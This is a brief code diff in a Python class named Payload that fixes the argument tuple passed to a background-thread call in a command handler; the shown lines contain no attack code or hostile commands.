@@ -32,7 +32,7 @@ class Payload(object):
 		if cmd['bg']:
 			new = cmd
 			new['bg'] = False
-			_thread.start_new_thread(self.handle, (new))
+			_thread.start_new_thread(self.handle, (new, ))
 			cmd['res'] = "started in background"
 			return cmd
 
